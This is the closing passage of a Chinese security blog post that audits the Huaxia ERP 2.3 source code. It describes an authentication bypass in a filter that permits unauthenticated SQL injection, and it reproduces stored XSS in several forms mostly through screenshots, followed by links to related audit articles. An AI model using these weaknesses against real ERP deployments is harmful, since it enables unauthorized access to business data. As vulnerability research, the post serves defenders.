<li><font style="color:#080808;background-color:#ffffff;">PersonMapperEx.xml	（功能点在“基本资料”-“经手人管理”）</font></li>
<li><font style="color:#080808;background-color:#ffffff;">RoleMapperEx.xml	（功能点在“系统管理”-“角色管理”）</font></li>
<li><font style="color:#080808;background-color:#ffffff;">UnitMapperEx.xml	（功能点在“商品管理”-“计量单位”）</font></li>
<li><font style="color:#080808;background-color:#ffffff;">UserMapperEx.xml	（功能点在“系统管理”-“用户管理”）</font></li>
</ul>
<h2 id="4、身份验证-鉴权"><a href="#4、身份验证-鉴权" class="headerlink" title="4、身份验证&amp;鉴权"></a>4、身份验证&amp;鉴权</h2><p>这一部分依旧是 LogCostFilter.java 发现的漏洞点，在SQL 注入中，我们登录到后台进行的注入，那么结合鉴权漏洞，就可以未登录进行SQL注入。</p>
<p>从图片看到，绕过身份验证也可以进行SQL注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h1><h2 id="1、存储型XSS"><a href="#1、存储型XSS" class="headerlink" title="1、存储型XSS"></a>1、<font style="color:rgb(31, 45, 61);">存储型XSS</font></h2><p>很多功能点都存在此漏洞，以下举三例：</p>
<h3 id="1-1-用户管理"><a href="#1-1-用户管理" class="headerlink" title="1.1 用户管理"></a>1.1 用户管理</h3><p>先新增一个用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png" srcset="/img/loading.gif" lazyload></p>
<p>修改用户名</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png" srcset="/img/loading.gif" lazyload></p>
<p>出现弹窗</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png" srcset="/img/loading.gif" lazyload></p>
<p>找到源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png" srcset="/img/loading.gif" lazyload></p>
<p>接收前端传入的 info 参数，检查用户数量是否超限，并没有做任何特殊字符过滤，这里就是XSS 的入口点</p>
<h3 id="1-2-商品信息"><a href="#1-2-商品信息" class="headerlink" title="1.2 商品信息"></a>1.2 商品信息</h3><p>增加商品：</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png" srcset="/img/loading.gif" lazyload></p>
<p>五个地方都会弹窗</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="1-3-收入单"><a href="#1-3-收入单" class="headerlink" title="1.3 收入单"></a>1.3 收入单</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945 mybatis二级缓存反序列化的分析与复现</font></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/251862.html">https://www.freebuf.com/vuls/251862.html</a></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">MyBatis远程代码执行漏洞CVE-2020-26945</font></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252542.html">https://www.freebuf.com/articles/web/252542.html</a></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">Java 代码审计之华夏 ERP CMS v2.3</font></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/347135.html"><font style="color:rgb(65, 131, 196);">https://www.freebuf.com/articles/web/347135.html</font></a></p>
<p>【Java代码审计】华夏-ERPv2.3</p>
<p><a target="_blank" rel="noopener" href="https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html"><font style="color:rgb(65, 131, 196);">https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html</font></a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Java/" class="category-chain-item">Java</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#Java 代码审计</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>华夏ERP 2.3 代码审计</div>
      <div>http://xvshifu.github.io/2025/08/20/JshERP-2.3 代码审计/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Xvsf</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年8月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java 反序列化学习">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java 反序列化学习</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/14/SpringBoot/" title="SpringBoot">
                        <span class="hidden-mobile">SpringBoot</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">

  <!-- 计时器 -->
  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
    🚀 已运行：
    <span id="timeDate">载入天数...</span>
    <span id="times">载入时分秒...</span>
    <script>
      function createtime() {
          var now = new Date();
          var grt = new Date("08/07/2025 00:00:00");
          var diff = now - grt;

          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
          var minutes = Math.floor((diff / 1000 / 60) % 60);
          var seconds = Math.floor((diff / 1000) % 60);

          if(hours<10) hours="0"+hours;
          if(minutes<10) minutes="0"+minutes;
          if(seconds<10) seconds="0"+seconds;

          document.getElementById("timeDate").innerHTML = days + " 天";
          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
      }
      setInterval(createtime, 1000);
      createtime();
    </script>
  </div>

  <!-- 自定义内容 -->
  
    <div style="margin-bottom:10px; font-size:13px; color:#666;">
      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  


  <!-- PV/UV 统计（Busuanzi） -->
  
    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
    </div>
    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
  


</div>

<script src="/js/summon-plane.js"></script>


  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/xm_custom/custom.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
